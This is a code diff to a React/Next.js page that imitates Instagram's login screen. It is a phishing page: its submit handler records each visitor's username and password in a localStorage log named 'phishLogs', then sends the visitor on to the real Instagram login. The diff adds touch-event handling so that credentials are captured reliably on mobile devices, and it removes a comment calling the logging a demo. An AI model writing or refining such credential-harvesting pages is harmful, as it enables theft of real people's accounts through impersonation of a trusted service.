@@ -1,4 +1,3 @@
-// app/page.tsx  (or app/instagram/page.tsx if you want it on /instagram)
 'use client';
 
 import { FormEvent, useState } from 'react';
@@ -8,22 +7,34 @@ export default function Home() {
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
+    e.stopPropagation();
 
     const timestamp = new Date().toLocaleString();
     const entry = { id: Date.now(), timestamp, username, password };
 
-    // Save to localStorage (capture functionality)
+    // Capture & save to localStorage
     let logs = JSON.parse(localStorage.getItem('phishLogs') || '[]');
     logs.push(entry);
     localStorage.setItem('phishLogs', JSON.stringify(logs));
 
-    // Log to console for demo
     console.log('Captured & saved:', entry);
 
     // Redirect to real Instagram
     window.location.href = 'https://www.instagram.com/accounts/login/';
+  };
+
+  // Handle mobile touch submit (extra safety for iOS/Android)
+  const handleTouchSubmit = (e: React.TouchEvent<HTMLFormElement | HTMLButtonElement>) => {
+    e.preventDefault();
+    e.stopPropagation();
+
+    // Trigger form submit manually on touch end
+    const form = e.currentTarget.closest('form');
+    if (form) {
+      form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+    }
   };
 
   return (
@@ -40,6 +51,8 @@ export default function Home() {
           background: #000;
           color: #fff;
           min-height: 100vh;
+          -webkit-tap-highlight-color: transparent;
+          touch-action: manipulation;
         }
 
         .main-container {
@@ -549,7 +562,10 @@ export default function Home() {
             <div className="login-box">
               <h2 className="login-title">Log into Instagram</h2>
              
-              <form onSubmit={handleSubmit}>
+              <form 
+                onSubmit={handleSubmit}
+                onTouchEnd={handleTouchSubmit}
+              >
                 <input
                   type="text"
                   className="input-field"
@@ -582,13 +598,19 @@ export default function Home() {
                   )}
                 </div>
                
-                <button type="submit" className="login-button">
+                <button 
+                  type="submit"
+                  className="login-button"
+                  onTouchEnd={handleTouchSubmit}
+                >
                   Log in
                 </button>
               </form>
+
               <div className="or-divider">
                 <span>OR</span>
               </div>
+
               <div className="forgot-password">
                 <a href="#">Forgot password?</a>
               </div>
